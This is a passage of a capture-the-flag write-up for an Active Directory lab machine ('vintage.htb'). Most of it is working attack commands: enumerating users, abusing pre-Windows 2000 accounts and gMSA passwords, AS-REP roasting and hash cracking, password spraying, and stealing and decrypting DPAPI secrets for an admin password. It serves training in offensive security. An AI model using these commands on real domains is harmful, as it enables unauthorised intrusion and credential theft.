+</pre></div>
+</div>
+<p>Getting a list of users with powerview.py</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python3<span class="w"> </span>/opt/powerview.py/powerview.py<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="s1">&#39;vintage.htb/p.rosa:Rosaisbest123@dc01.vintage.htb&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-k
+</pre></div>
+</div>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Get-DomainUser</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>cat<span class="w"> </span>users
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">administrator</span>
+<span class="n">guest</span>
+<span class="n">krbtgt</span>
+<span class="n">svc_ark</span>
+<span class="n">svc_ldap</span>
+<span class="n">svc_sql</span>
+<span class="n">l</span><span class="o">.</span><span class="n">bianchi_adm</span>
+<span class="n">c</span><span class="o">.</span><span class="n">neri_adm</span>
+<span class="n">p</span><span class="o">.</span><span class="n">rosa</span>
+<span class="n">c</span><span class="o">.</span><span class="n">neri</span>
+<span class="n">g</span><span class="o">.</span><span class="n">viola</span>
+<span class="n">l</span><span class="o">.</span><span class="n">bianchi</span>
+<span class="n">r</span><span class="o">.</span><span class="n">verdi</span>
+<span class="n">m</span><span class="o">.</span><span class="n">rossi</span>
+</pre></div>
+</div>
+<p>We could also have done it with ldapsearch</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-LLL<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-H<span class="w"> </span>ldap://10.10.11.45:389<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-b<span class="w"> </span><span class="s2">&quot;CN=users,DC=vintage,DC=htb&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-D<span class="w"> </span><span class="s2">&quot;p.rosa@vintage.htb&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-w<span class="w"> </span><span class="s2">&quot;Rosaisbest123&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="s2">&quot;(objectClass=user)&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>sAMAccountName<span class="w"> </span><span class="p">|</span><span class="se">\</span>
+grep<span class="w"> </span>sAMAccountName<span class="w"> </span><span class="p">|</span><span class="se">\</span>
+cut<span class="w"> </span>-d<span class="s1">&#39; &#39;</span><span class="w"> </span>-f<span class="w"> </span><span class="m">2</span>
+</pre></div>
+</div>
+</section>
+<section id="pre-windows-2000-compatible-access">
+<h2>Pre-windows 2000 compatible access<a class="headerlink" href="#pre-windows-2000-compatible-access" title="Permalink to this heading">#</a></h2>
+<ul class="simple">
+<li><p><a class="reference external" href="https://www.semperis.com/blog/security-risks-pre-windows-2000-compatibility-windows-2022/">https://www.semperis.com/blog/security-risks-pre-windows-2000-compatibility-windows-2022/</a></p></li>
+<li><p><a class="reference external" href="https://trustedsec.com/blog/diving-into-pre-created-computer-accounts">https://trustedsec.com/blog/diving-into-pre-created-computer-accounts</a></p></li>
+<li><p><a class="reference external" href="https://www.hackingarticles.in/abusing-ad-weak-permission-pre2k-compatibility/">https://www.hackingarticles.in/abusing-ad-weak-permission-pre2k-compatibility/</a></p></li>
+</ul>
+<p>Looking at things in bloodhound we can see that the <code class="docutils literal notranslate"><span class="pre">AUTHENTICATED</span> <span class="pre">USERS</span></code> group is a member of <code class="docutils literal notranslate"><span class="pre">PRE-WINDOWS</span> <span class="pre">2000</span> <span class="pre">COMPATIBLE</span> <span class="pre">ACCESS</span></code> as pointed out in the semperis blog as a being a default. This means all users including rosa can use that on the FS01 computer.</p>
+<p><img alt="pre2k.png" src="../../../../_images/pre2k.png" /></p>
+<p>Trying and failing to dump hashes with different tools. I think this doesn’t work because windows auth is disabled, and we need to authenticate via kerberos, which may not be working with those.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="m">10</span>.10.11.45<span class="w"> </span>-k<span class="w"> </span>--use-kcache<span class="w"> </span>-M<span class="w"> </span>pre2k
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="m">10</span>.10.11.45<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;p.rosa&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Rosaisbest123&#39;</span><span class="w"> </span>-M<span class="w"> </span>pre2k
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>pre2k<span class="w"> </span>auth<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;p.rosa&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Rosaisbest123&#39;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.11.45<span class="w"> </span>-d<span class="w"> </span>ignite.local
+</pre></div>
+</div>
+<p>Reading further on the trustedsec blog above I found out that by default checking the <code class="docutils literal notranslate"><span class="pre">Assign</span> <span class="pre">this</span> <span class="pre">computer</span> <span class="pre">account</span> <span class="pre">as</span> <span class="pre">a</span> <span class="pre">pre-Windows</span> <span class="pre">2000</span> <span class="pre">computer</span></code> box will create default computer accounts with a password matching the name of the computer in lowercase</p>
+<p>So like that? Yes</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>getTGT.py<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.11.45<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="s1">&#39;vintage.htb/FS01$:fs01&#39;</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="s1">&#39;FS01$.ccache&#39;</span>
+</pre></div>
+</div>
+</section>
+<section id="fs01-has-readgmsapassword">
+<h2>FS01 has ReadGMSAPassword<a class="headerlink" href="#fs01-has-readgmsapassword" title="Permalink to this heading">#</a></h2>
+<p>So we have a ticket as the FS01 computer account, lets look at bloodhound again to find what we might want to do with that.</p>
+<p><img alt="gmsa.png" src="../../../../_images/gmsa.png" /></p>
+<p>A gMSA or group Managed Service Account is a domain account that can be used to run services on multiple servers without having to manage the password. The gMSA provides automatic password management and simplified service principal name (SPN) management, including delegation of management to other administrators.</p>
+<p>So when logged in as FS01 we should be able to read the password of the gMSA, or dump its hash.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>bloodyAD<span class="w"> </span>-k<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--dc-ip<span class="w"> </span><span class="m">10</span>.10.11.45<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--host<span class="w"> </span>dc01.vintage.htb<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;VINTAGE.HTB&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>get<span class="w"> </span>object<span class="w"> </span><span class="s1">&#39;GMSA01$&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">      </span>--attr<span class="w"> </span>msDS-ManagedPassword
+</pre></div>
+</div>
+<p>We can get a TGT as the gMSA based on the NT hash</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>getTGT.py<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.11.45<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="s1">&#39;vintage.htb/GMSA01$:&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-hashes<span class="w"> </span><span class="s1">&#39;:5143*********************&#39;</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="s1">&#39;GMSA01$.ccache&#39;</span>
+</pre></div>
+</div>
+</section>
+<section id="gmsa-genericwrite-over-servicemanagers">
+<h2>gMSA genericWrite over servicemanagers<a class="headerlink" href="#gmsa-genericwrite-over-servicemanagers" title="Permalink to this heading">#</a></h2>
+<p>Once again back to bloodhound, looking at the outbound object control for the gMSA, it does have <code class="docutils literal notranslate"><span class="pre">addSelf</span></code>, and <code class="docutils literal notranslate"><span class="pre">genericWrite</span></code> over the <code class="docutils literal notranslate"><span class="pre">SERVICEMANAGERS</span></code> group.</p>
+<p><img alt="generic.png" src="../../../../_images/generic.png" /></p>
+<p>So while logged in over kerberos as the gMSA, we can add p.rosa as a member of service managers.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>bloodyAD<span class="w"> </span>-k<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--dc-ip<span class="w"> </span><span class="m">10</span>.10.11.45<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--host<span class="w"> </span>dc01.vintage.htb<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;VINTAGE.HTB&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>add<span class="w"> </span>groupMember<span class="w"> </span><span class="s2">&quot;SERVICEMANAGERS&quot;</span><span class="w"> </span><span class="s2">&quot;P.Rosa&quot;</span>
+</pre></div>
+</div>
+</section>
+<section id="servicemanagers-genericwrite-over-system-accounts">
+<h2>Servicemanagers genericWrite over system accounts<a class="headerlink" href="#servicemanagers-genericwrite-over-system-accounts" title="Permalink to this heading">#</a></h2>
+<p>This is helpful because servicemanagers has generic write over those 3 accounts
+<img alt="acc.png" src="../../../../_images/acc.png" /></p>
+<p>Get a TGT as rosa again</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>getTGT.py<span class="w"> </span>vintage.htb/p.rosa:<span class="s1">&#39;Rosaisbest123&#39;</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>p.rosa.ccache
+</pre></div>
+</div>
+<p>Validate that we are indeed a member of servicemanagers</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>bloodyAD<span class="w"> </span>-k<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--dc-ip<span class="w"> </span><span class="m">10</span>.10.11.45<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--host<span class="w"> </span>dc01.vintage.htb<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;VINTAGE.HTB&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>get<span class="w"> </span>membership<span class="w"> </span>p.rosa
+</pre></div>
+</div>
+<p>A mentionned before we have genericWrite over a few service accounts, so we could add the <code class="docutils literal notranslate"><span class="pre">DONT_REQ_PREAUTH</span></code> <code class="docutils literal notranslate"><span class="pre">User</span> <span class="pre">Account</span> <span class="pre">Control</span></code>, to <code class="docutils literal notranslate"><span class="pre">Kerberoast</span></code> them later, let’s just sanity check this first and see if it is disabled on any of the users we know about. We’ll use the user list we have gathered in our ldap enumeration phase.</p>
+<p>No it’s not disabled anywhere yet.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>GetNPUsers.py<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.11.45<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-usersfile<span class="w"> </span>loot/users<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-request<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>vintage.htb/
+</pre></div>
+</div>
+<p>Let’s disable it on all 3 accounts</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>bloodyAD<span class="w"> </span>-k<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--dc-ip<span class="w"> </span><span class="m">10</span>.10.11.45<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--host<span class="w"> </span>dc01.vintage.htb<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;VINTAGE.HTB&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>add<span class="w"> </span>uac<span class="w"> </span>SVC_ARK<span class="w"> </span><span class="se">\</span>
+<span class="w">      </span>-f<span class="w"> </span>DONT_REQ_PREAUTH
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>bloodyAD<span class="w"> </span>-k<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--dc-ip<span class="w"> </span><span class="m">10</span>.10.11.45<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--host<span class="w"> </span>dc01.vintage.htb<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;VINTAGE.HTB&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>add<span class="w"> </span>uac<span class="w"> </span>SVC_LDAP<span class="w"> </span><span class="se">\</span>
+<span class="w">      </span>-f<span class="w"> </span>DONT_REQ_PREAUTH
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>bloodyAD<span class="w"> </span>-k<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--dc-ip<span class="w"> </span><span class="m">10</span>.10.11.45<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--host<span class="w"> </span>dc01.vintage.htb<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;VINTAGE.HTB&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>add<span class="w"> </span>uac<span class="w"> </span>SVC_SQL<span class="w"> </span><span class="se">\</span>
+<span class="w">      </span>-f<span class="w"> </span>DONT_REQ_PREAUTH
+</pre></div>
+</div>
+</section>
+<section id="as-rep-roasting">
+<h2>AS-Rep Roasting<a class="headerlink" href="#as-rep-roasting" title="Permalink to this heading">#</a></h2>
+<p>Now we can dump the as-rep hashes for them, except <code class="docutils literal notranslate"><span class="pre">svc_sql</span></code>, we get <code class="docutils literal notranslate"><span class="pre">KDC_ERR_CLIENT_REVOKED</span></code></p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>GetNPUsers.py<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.11.45<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-usersfile<span class="w"> </span>loot/users<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-request<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>vintage.htb/
+</pre></div>
+</div>
+<p>This is because this account has the <code class="docutils literal notranslate"><span class="pre">ACCOUNTDISABLE</span></code> <code class="docutils literal notranslate"><span class="pre">uac</span></code></p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>bloodyAD<span class="w"> </span>-k<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--dc-ip<span class="w"> </span><span class="m">10</span>.10.11.45<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--host<span class="w"> </span>dc01.vintage.htb<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;VINTAGE.HTB&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>get<span class="w"> </span>object<span class="w"> </span>SVC_SQL
+</pre></div>
+</div>
+<p>Let’s just remove that</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>bloodyAD<span class="w"> </span>-k<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--dc-ip<span class="w"> </span><span class="m">10</span>.10.11.45<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--host<span class="w"> </span>dc01.vintage.htb<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;VINTAGE.HTB&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>remove<span class="w"> </span>uac<span class="w"> </span>SVC_SQL<span class="w"> </span><span class="se">\</span>
+<span class="w">     </span>-f<span class="w"> </span>ACCOUNTDISABLE
+</pre></div>
+</div>
+<p>And roast again, now we get an as-rep for all 3 accounts</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>GetNPUsers.py<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.11.45<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-usersfile<span class="w"> </span>loot/users<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-request<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>vintage.htb/
+</pre></div>
+</div>
+<p>Lookup the correct hashcat mode for as-rep</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>hashcat<span class="w"> </span>--help<span class="p">|</span>grep<span class="w"> </span>-i<span class="w"> </span>as-rep
+</pre></div>
+</div>
+<p>And run rockyou through it</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">18200</span><span class="w"> </span>roast<span class="w"> </span>~/.local/share/seclists/rockyou.txt<span class="w"> </span>
+</pre></div>
+</div>
+<p>We managed to crack the <code class="docutils literal notranslate"><span class="pre">svc_sql</span></code> account</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">18200</span><span class="w"> </span>roast<span class="w"> </span>~/.local/share/seclists/rockyou.txt<span class="w"> </span>--show
+</pre></div>
+</div>
+<p>Get a TGT with that…</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>getTGT.py<span class="w"> </span>vintage.htb/svc_sql:<span class="s1">&#39;Zer******&#39;</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>svc_sql.ccache
+</pre></div>
+</div>
+<p>But as we saw on the initial nmap run there’s no mssql service running on this box, it does make sense, this account is disabled for a reason.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>nxc<span class="w"> </span>mssql<span class="w"> </span><span class="m">10</span>.10.11.45<span class="w"> </span>-k<span class="w"> </span>--use-kcache
+</pre></div>
+</div>
+</section>
+<section id="password-reuse">
+<h2>Password Reuse<a class="headerlink" href="#password-reuse" title="Permalink to this heading">#</a></h2>
+<p>But the password might have been reused somewhere</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>kerbrute<span class="w"> </span>passwordspray<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--dc<span class="w"> </span>vintage.htb<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span>vintage.htb<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>loot/users<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="s1">&#39;Zer******&#39;</span>
+</pre></div>
+</div>
+<p>And it has been reused indeed by the c.neri user</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>getTGT.py<span class="w"> </span>vintage.htb/c.neri:<span class="s1">&#39;Zer******&#39;</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>c.neri.ccache
+</pre></div>
+</div>
+<p>Configure the realm properly</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>cat<span class="w"> </span>/etc/krb5.conf
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">[</span><span class="n">libdefaults</span><span class="p">]</span>
+    <span class="n">default_realm</span> <span class="o">=</span> <span class="n">VINTAGE</span><span class="o">.</span><span class="n">HTB</span>
+    <span class="n">dns_lookup_realm</span> <span class="o">=</span> <span class="n">false</span>
+    <span class="n">dns_lookup_kdc</span> <span class="o">=</span> <span class="n">true</span>
+
+<span class="p">[</span><span class="n">realms</span><span class="p">]</span>
+    <span class="n">VINTAGE</span><span class="o">.</span><span class="n">HTB</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="n">kdc</span> <span class="o">=</span> <span class="n">vintage</span><span class="o">.</span><span class="n">htb</span>
+        <span class="n">admin_server</span> <span class="o">=</span> <span class="n">vintage</span><span class="o">.</span><span class="n">htb</span>
+    <span class="p">}</span>
+
+<span class="p">[</span><span class="n">domain_realm</span><span class="p">]</span>
+    <span class="o">.</span><span class="n">vintage</span><span class="o">.</span><span class="n">htb</span> <span class="o">=</span> <span class="n">VINTAGE</span><span class="o">.</span><span class="n">HTB</span>
+    <span class="n">vintage</span><span class="o">.</span><span class="n">htb</span> <span class="o">=</span> <span class="n">VINTAGE</span><span class="o">.</span><span class="n">HTB</span>
+</pre></div>
+</div>
+<p>And we can now winrm as c.neri</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>evil-winrm<span class="w"> </span>-i<span class="w"> </span>dc01.vintage.htb<span class="w"> </span>-r<span class="w"> </span>vintage.htb
+</pre></div>
+</div>
+</section>
+<section id="stealing-and-decrypting-dpapi-secrets">
+<h2>Stealing and Decrypting DPAPI Secrets<a class="headerlink" href="#stealing-and-decrypting-dpapi-secrets" title="Permalink to this heading">#</a></h2>
+<ul class="simple">
+<li><p><a class="reference external" href="https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets">https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets</a></p></li>
+</ul>
+<p>.NET provides access to the Data Protection API (DPAPI), it is an internal component in the Windows system. It allows various applications to store sensitive data (e.g. passwords).</p>
+<p>The data is stored in the users directory and is secured by user-specific master keys derived from the users password.</p>
+<section id="stealing-the-encryption-key">
+<h3>Stealing the Encryption Key<a class="headerlink" href="#stealing-the-encryption-key" title="Permalink to this heading">#</a></h3>
+<p>The keys are usually located in:</p>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID</span></code></p></li>
+</ul>
+<p>The download helper of evil-winrm doesn’t work for me so, since those are pretty small anyway, I’m just encoding them in base64 to exflitrate them through the clipboard</p>
+<p>Getting the SID and GUID for c.neri</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>bloodyAD<span class="w"> </span>-k<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--dc-ip<span class="w"> </span><span class="m">10</span>.10.11.45<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--host<span class="w"> </span>dc01.vintage.htb<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;VINTAGE.HTB&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>get<span class="w"> </span>object<span class="w"> </span>c.neri
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">objectGUID</span><span class="p">:</span> <span class="mf">486e5074</span><span class="o">-</span><span class="n">c6a2</span><span class="o">-</span><span class="mi">476</span><span class="n">f</span><span class="o">-</span><span class="n">b4ba</span><span class="o">-</span><span class="mi">5</span><span class="n">c8a925ef7e6</span>
+<span class="n">objectSid</span><span class="p">:</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4024337825</span><span class="o">-</span><span class="mi">2033394866</span><span class="o">-</span><span class="mi">2055507597</span><span class="o">-</span><span class="mi">1115</span>
+</pre></div>
+</div>
+<p>Getting the key</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="no">[System.Convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="no">[System.IO.File]</span><span class="p">::</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="s2">&quot;C:\Users\C.Neri\appdata\roaming\microsoft\credentials\C4BB96844A5C9DD45D5B6A9859252BA6&quot;</span><span class="p">))</span>
+</pre></div>
+</div>
+<p>Dropping it into my machine</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>wl-paste<span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span>&gt;<span class="w"> </span>C4BB96844A5C9DD45D5B6A9859252BA6
+</pre></div>
+</div>
+</section>
+<section id="stealing-encrypted-secrets">
+<h3>Stealing Encrypted Secrets<a class="headerlink" href="#stealing-encrypted-secrets" title="Permalink to this heading">#</a></h3>
+<p>DPAPI-protected secrets are typically located in:</p>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">C:\Users\$USER\AppData\Local\Microsoft\Credentials\</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">C:\Users\$USER\AppData\Roaming\Microsoft\Credentials\</span></code></p></li>
+</ul>
+<p>Looking around</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">cd </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">C</span><span class="p">.</span><span class="n">Neri</span><span class="p">\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Roaming</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Protect</span><span class="p">\</span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">4024337825</span><span class="p">-</span><span class="n">2033394866</span><span class="p">-</span><span class="n">2055507597</span><span class="p">-</span><span class="n">1115</span>
+</pre></div>
+</div>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">dir </span><span class="n">-h</span>
+</pre></div>
+</div>
+<p>Exfil</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="no">[System.Convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="no">[System.IO.File]</span><span class="p">::</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="s2">&quot;C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\99cf41a3-a552-4cf7-a8d7-aca2d6f7339b&quot;</span><span class="p">))</span>
+</pre></div>
+</div>
+<p>Dropping it into my own box</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>wl-paste<span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span>&gt;<span class="w"> </span>99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
+</pre></div>
+</div>
+</section>
+<section id="decrypting-the-secrets">
+<h3>Decrypting the secrets<a class="headerlink" href="#decrypting-the-secrets" title="Permalink to this heading">#</a></h3>
+<p>The encryption key is password protected, but we already have the user’s password</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>dpapi.py<span class="w"> </span>masterkey<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-file<span class="w"> </span>99cf41a3-a552-4cf7-a8d7-aca2d6f7339b<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-sid<span class="w"> </span>S-1-5-21-4024337825-2033394866-2055507597-1115<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-password<span class="w"> </span>Zer******
+</pre></div>
+</div>
+<p>Now with the key in plaintext for we can decrypt the secret and it’s the password for <code class="docutils literal notranslate"><span class="pre">c.neri_adm</span></code></p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>dpapi.py<span class="w"> </span>credential<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-file<span class="w"> </span>C4BB96844A5C9DD45D5B6A9859252BA6<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-key<span class="w"> </span>0xf*******************************************************************************************************************************
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>getTGT.py<span class="w"> </span>vintage.htb/c.neri_adm:<span class="s1">&#39;Uncr4ck4bl3P4ssW0rd0312&#39;</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>c.neri_adm.ccache
+</pre></div>
+</div>
+<p>Cool, back to bloodhound.</p>
+</section>
+</section>
+<section id="c-neri-adm-genericwrite-to-delegatedadmins">
+<h2>C Neri Adm GenericWrite to DelegatedAdmins<a class="headerlink" href="#c-neri-adm-genericwrite-to-delegatedadmins" title="Permalink to this heading">#</a></h2>
+<ul class="simple">
+<li><p><a class="reference external" href="https://medium.com/r3d-buck3t/attacking-kerberos-constrained-delegations-4a0eddc5bb13">https://medium.com/r3d-buck3t/attacking-kerberos-constrained-delegations-4a0eddc5bb13</a></p></li>
+</ul>
+<p>Same as usual we’re looking at the outbound object controls for <code class="docutils literal notranslate"><span class="pre">c.neri_adm</span></code> and it has generiWrite over a group called delegated admins</p>
+<p><img alt="adm.png" src="../../../../_images/adm.png" /></p>
+<p>Which means we can connect as <code class="docutils literal notranslate"><span class="pre">c.neri_adm</span></code> and add members to <code class="docutils literal notranslate"><span class="pre">delegatedadmins</span></code>, we’ll add <code class="docutils literal notranslate"><span class="pre">svc_sql</span></code></p>
